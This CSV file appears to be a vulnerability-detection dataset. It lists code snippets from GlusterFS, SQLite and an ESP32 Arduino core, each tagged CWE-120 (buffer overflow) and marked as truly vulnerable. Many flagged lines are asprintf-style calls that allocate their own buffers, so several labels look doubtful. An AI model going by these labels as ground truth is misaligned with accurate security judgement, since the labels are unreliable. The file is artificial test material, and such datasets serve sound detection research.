GithubID,Year,FullPath,Codesnippet,CWE,isTrueVulnerable,Codesnippet5
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = gf_asprintf (&header, ""[%s] %s [%s:%d:%s] %s""",120,1,"                                           domain);
                } else {
                        ret = gf_asprintf (&header, ""[%s] %s [%s:%d:%s] %s""
                                                    "" %d-%s: "",
                                           timestr, gf_level_strings[level],
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = gf_asprintf (&header, ""[%s] %s [MSGID: %""""l"" ""u""""]""",120,1,"
                if (!callstr) {
                        ret = gf_asprintf (&header, ""[%s] %s [MSGID: %""""l"" ""u""""]""
                                                    "" [%s:%d:%s] %d-%s: "",
                                           timestr, gf_level_strings[level],
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = gf_asprintf (&footer, "" [%s]"",strerror(errnum));",120,1,"
        if (errnum) {
                ret = gf_asprintf (&footer, "" [%s]"",strerror(errnum));
                if (-1 == ret) {
                        goto err;
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = gf_asprintf (&header, ""The message \""%s [MSGID: %""""l"" ""u""""]""",120,1,"                  "".%""""06ld"", oldest.tv_usec);

        ret = gf_asprintf (&header, ""The message \""%s [MSGID: %""""l"" ""u""""]""
                           "" [%s:%d:%s] %d-%s: "", gf_level_strings[level],
                           msgid, file, line, function, graph_id, domain);
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = gf_asprintf (&footer, ""%s\"" repeated %d times between""",120,1,"                          strerror (errnum));

        ret = gf_asprintf (&footer, ""%s\"" repeated %d times between""
                           "" [%s] and [%s]"", errstr, refcount, timestr_oldest,
                           timestr_latest);
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = vasprintf (&msgstr, fmt, ap);",120,1,"
        __builtin_va_start(ap,fmt);
        ret = vasprintf (&msgstr, fmt, ap);
        __builtin_va_end(ap);

"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = gf_asprintf (&str1, ""[%s] %s [%s:%d:%s] %d-%s: "",",120,1,"                  "".%""""06ld"", tv.tv_usec);

        ret = gf_asprintf (&str1, ""[%s] %s [%s:%d:%s] %d-%s: "",
                           timestr, level_strings[level],
                           basename, line, function,
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = gf_asprintf (&str1, ""[%d] %s: "",",120,1,"        this = (*__glusterfs_this_location());

        ret = gf_asprintf (&str1, ""[%d] %s: "",
                           ((this->graph)?this->graph->id:0),
                           function);
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = gf_asprintf (&str1, ""[%s] %s : "",",120,1,"                  "".%""""06ld"", tv.tv_usec);

        ret = gf_asprintf (&str1, ""[%s] %s : "",
                           timestr, domain);
        if (ret == -1) {
"
2021\cslim\test\libglusterfs\mem-pool.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\mem-pool.cpp.c,"ret = gf_asprintf (&mem_pool->name, ""%s:%s"", (*__glusterfs_this_location())->name, name);",120,1,"                return ((void *)0);

        ret = gf_asprintf (&mem_pool->name, ""%s:%s"", (*__glusterfs_this_location())->name, name);
        if (ret < 0)
                return ((void *)0);
"
2021\cslim\test\libglusterfs\run.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\run.cpp.c,"ret = gf_vasprintf (&arg, format, argva);",120,1,"
        __builtin_va_start(argva,format);
        ret = gf_vasprintf (&arg, format, argva);
        __builtin_va_end(argva);

"
2021\cslim\test\libglusterfs\xlator.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\xlator.cpp.c,"ret = gf_asprintf (&name, ""%s/%s.so"", XLATORDIR, xlator_type);",120,1,"
        if (!strstr(xlator_type, ""rpc-transport""))
                ret = gf_asprintf (&name, ""%s/%s.so"", XLATORDIR, xlator_type);
        else
                ret = gf_asprintf (&name, ""%s/%s.so"", XLATORPARENTDIR, xlator_type);
"
2021\cslim\test\libglusterfs\xlator.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\xlator.cpp.c,"ret = gf_asprintf (&name, ""%s/%s.so"", XLATORPARENTDIR, xlator_type);",120,1,"                ret = gf_asprintf (&name, ""%s/%s.so"", XLATORDIR, xlator_type);
        else
                ret = gf_asprintf (&name, ""%s/%s.so"", XLATORPARENTDIR, xlator_type);
        if (-1 == ret) {
                goto out;
"
2021\cslim\test\libglusterfs\xlator.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\xlator.cpp.c,"ret = gf_asprintf (&name, ""%s/%s.so"", XLATORDIR, xl->type);",120,1,"        do { (&xl->volume_options)->next = (&xl->volume_options)->prev = &xl->volume_options; } while (0);

        ret = gf_asprintf (&name, ""%s/%s.so"", XLATORDIR, xl->type);
        if (-1 == ret) {
                goto out;
"
2021\cslim\test\libglusterfs\xlator.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\xlator.cpp.c,"ret = gf_asprintf ((char**)&loc->path, ""<gfid:%s>""""/%s"",",120,1,"                ret = inode_path (loc->parent, bname, (char**)&loc->path);
        } else if (!gf_uuid_is_null (loc->pargfid)) {
                ret = gf_asprintf ((char**)&loc->path, ""<gfid:%s>""""/%s"",
                                   uuid_utoa (loc->pargfid), bname);
        }
"
2021\cslim\test\libglusterfs\xlator.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\xlator.cpp.c,"ret = gf_asprintf ((char**)&loc->path, ""<gfid:%s>"",",120,1,"                ret = inode_path (loc->inode, ((void *)0), (char **)&loc->path);
        } else if (!gf_uuid_is_null (loc->gfid)) {
                ret = gf_asprintf ((char**)&loc->path, ""<gfid:%s>"",
                                   uuid_utoa (loc->gfid));
        }
"
2021\cslim\test\libglusterfs\xlator.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\xlator.cpp.c,"ret = gf_asprintf ((char **)&child->path, ""/%s"", name);",120,1,"
        if (strcmp (parent->path, ""/"") == 0)
                ret = gf_asprintf ((char **)&child->path, ""/%s"", name);
        else
                ret = gf_asprintf ((char **)&child->path, ""%s/%s"", parent->path,
"
2021\cslim\test\libglusterfs\xlator.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\xlator.cpp.c,"ret = gf_asprintf ((char **)&child->path, ""%s/%s"", parent->path,",120,1,"                ret = gf_asprintf ((char **)&child->path, ""/%s"", name);
        else
                ret = gf_asprintf ((char **)&child->path, ""%s/%s"", parent->path,
                                   name);

"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"if( !(((p)->printfFlags & 0x04)!=0) && p->nChar>0 ) memcpy(zNew, p->zText, p->nChar);",120,1,"
      ((void) (0));
      if( !(((p)->printfFlags & 0x04)!=0) && p->nChar>0 ) memcpy(zNew, p->zText, p->nChar);
      p->zText = zNew;
      p->nAlloc = sqlite3DbMallocSize(p->db, zNew);
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"sprintf(buf1,""%0*d"",lenDigits,tdq->length);",120,1,"        tdq=&i2c->dq[a];
        char buf1[10],buf2[10];
        sprintf(buf1,""%0*d"",lenDigits,tdq->length);
        sprintf(buf2,""%0*d"",lenDigits,tdq->position);
        log_i(""[%0*d] %sbit %x %c %s buf@=%p, len=%s, pos=%s, ctrl=%d%d%d%d%d"",digits,a,
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"sprintf(buf2,""%0*d"",lenDigits,tdq->position);",120,1,"        char buf1[10],buf2[10];
        sprintf(buf1,""%0*d"",lenDigits,tdq->length);
        sprintf(buf2,""%0*d"",lenDigits,tdq->position);
        log_i(""[%0*d] %sbit %x %c %s buf@=%p, len=%s, pos=%s, ctrl=%d%d%d%d%d"",digits,a,
        (tdq->ctrl.addr>0x100)?""10"":""7"",
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"j=sprintf(buff,""0x%04x: "",offset);",120,1,"            buff[139]='\0';
            uint16_t i = 0,j;
            j=sprintf(buff,""0x%04x: "",offset);
            while((i<32)&&(offset < tdq->length)) {
                char ch = tdq->data[offset];
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"sprintf((char*)&buff[(i*3)+41],""%02x "",ch);",120,1,"            while((i<32)&&(offset < tdq->length)) {
                char ch = tdq->data[offset];
                sprintf((char*)&buff[(i*3)+41],""%02x "",ch);
                if((ch<32)||(ch>126)) {
                    ch='.';
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"j+=sprintf((char*)&buff[j],""%c"",ch);",120,1,"                    ch='.';
                }
                j+=sprintf((char*)&buff[j],""%c"",ch);
                buff[j]=' ';
                i++;
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"k+= sprintf(&buf[k],""READ  0x%02X"",(fifoBuffer[i]&0xff)>>1);",120,1,"        if(fifoBuffer[i] & 0x100) { // read
          if(fifoBuffer[i] & 0x1) { // valid read dev id
            k+= sprintf(&buf[k],""READ  0x%02X"",(fifoBuffer[i]&0xff)>>1);
          } else { // invalid read dev id
            k+= sprintf(&buf[k],""Bad READ  0x%02X"",(fifoBuffer[i]&0xff));
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"k+= sprintf(&buf[k],""Bad READ  0x%02X"",(fifoBuffer[i]&0xff));",120,1,"            k+= sprintf(&buf[k],""READ  0x%02X"",(fifoBuffer[i]&0xff)>>1);
          } else { // invalid read dev id
            k+= sprintf(&buf[k],""Bad READ  0x%02X"",(fifoBuffer[i]&0xff));
          }
        } else { // write
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"k+= sprintf(&buf[k],""bad WRITE 0x%02X"",(fifoBuffer[i]&0xff));",120,1,"        } else { // write
          if(fifoBuffer[i] & 0x1) { // bad write dev id
            k+= sprintf(&buf[k],""bad WRITE 0x%02X"",(fifoBuffer[i]&0xff));
          } else { // good Write
            k+= sprintf(&buf[k],""WRITE 0x%02X"",(fifoBuffer[i]&0xff)>>1);
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"k+= sprintf(&buf[k],""WRITE 0x%02X"",(fifoBuffer[i]&0xff)>>1);",120,1,"            k+= sprintf(&buf[k],""bad WRITE 0x%02X"",(fifoBuffer[i]&0xff));
          } else { // good Write
            k+= sprintf(&buf[k],""WRITE 0x%02X"",(fifoBuffer[i]&0xff)>>1);
          }
        }
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"} else k += sprintf(&buf[k],""% 4X "",fifoBuffer[i]);",120,1,"          }
        }
      } else k += sprintf(&buf[k],""% 4X "",fifoBuffer[i]);

      i++;
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"k=sprintf(buf,""-> "");",120,1,"      outBuffer = false;
      if(k>50) {
        k=sprintf(buf,""-> "");
      }
    }while( i!= fifoPos);
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-time.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-time.c,"sprintf(cst, ""UTC%ld:%02u:%02u"", offset / 3600, abs((offset % 3600) / 60), abs(offset % 60));",120,1,"
    if(offset % 3600){
        sprintf(cst, ""UTC%ld:%02u:%02u"", offset / 3600, abs((offset % 3600) / 60), abs(offset % 60));
    } else {
        sprintf(cst, ""UTC%ld"", offset / 3600);
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-time.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-time.c,"sprintf(cst, ""UTC%ld"", offset / 3600);",120,1,"        sprintf(cst, ""UTC%ld:%02u:%02u"", offset / 3600, abs((offset % 3600) / 60), abs(offset % 60));
    } else {
        sprintf(cst, ""UTC%ld"", offset / 3600);
    }
    if(daylight != 3600){
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-time.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-time.c,"sprintf(cdt, ""DST%ld:%02u:%02u"", tz_dst / 3600, abs((tz_dst % 3600) / 60), abs(tz_dst % 60));",120,1,"        long tz_dst = offset - daylight;
        if(tz_dst % 3600){
            sprintf(cdt, ""DST%ld:%02u:%02u"", tz_dst / 3600, abs((tz_dst % 3600) / 60), abs(tz_dst % 60));
        } else {
            sprintf(cdt, ""DST%ld"", tz_dst / 3600);
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-time.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-time.c,"sprintf(cdt, ""DST%ld"", tz_dst / 3600);",120,1,"            sprintf(cdt, ""DST%ld:%02u:%02u"", tz_dst / 3600, abs((tz_dst % 3600) / 60), abs(tz_dst % 60));
        } else {
            sprintf(cdt, ""DST%ld"", tz_dst / 3600);
        }
    }
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-time.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-time.c,"sprintf(tz, ""%s%s"", cst, cdt);",120,1,"        }
    }
    sprintf(tz, ""%s%s"", cst, cdt);
    setenv(""TZ"", tz, 1);
    tzset();
"
2021\deneyapkart-arduino-core\cores\esp32\IPAddress.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\IPAddress.cpp,"sprintf(szRet,""%u.%u.%u.%u"", _address.bytes[0], _address.bytes[1], _address.bytes[2], _address.bytes[3]);",120,1,"{
    char szRet[16];
    sprintf(szRet,""%u.%u.%u.%u"", _address.bytes[0], _address.bytes[1], _address.bytes[2], _address.bytes[3]);
    return String(szRet);
}
"
2021\deneyapkart-arduino-core\cores\esp32\IPv6Address.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\IPv6Address.cpp,"sprintf(szRet,""%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x"",",120,1,"{
    char szRet[40];
    sprintf(szRet,""%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x"",
            _address.bytes[0], _address.bytes[1], _address.bytes[2], _address.bytes[3],
            _address.bytes[4], _address.bytes[5], _address.bytes[6], _address.bytes[7],
"
2021\deneyapkart-arduino-core\cores\esp32\MD5Builder.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\MD5Builder.cpp,"sprintf(output + (i * 2), ""%02x"", _buf[i]);",120,1,"{
    for(uint8_t i = 0; i < 16; i++) {
        sprintf(output + (i * 2), ""%02x"", _buf[i]);
    }
}
"
2021\deneyapkart-arduino-core\cores\esp32\WString.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\WString.cpp,"sprintf(buf, ""%d"", value);",120,1,"    char buf[2 + 8 * sizeof(int)];
    if (base == 10) {
        sprintf(buf, ""%d"", value);
    } else {
        itoa(value, buf, base);
"
2021\deneyapkart-arduino-core\cores\esp32\WString.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\WString.cpp,"sprintf(buf, ""%ld"", value);",120,1,"    char buf[2 + 8 * sizeof(long)];
    if (base==10) {
        sprintf(buf, ""%ld"", value);
    } else {
        ltoa(value, buf, base);
"
2021\deneyapkart-arduino-core\cores\esp32\WString.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\WString.cpp,"sprintf(buf, ""%d"", num);",120,1,"unsigned char String::concat(unsigned char num) {
    char buf[1 + 3 * sizeof(unsigned char)];
    sprintf(buf, ""%d"", num);
    return concat(buf, strlen(buf));
}
"
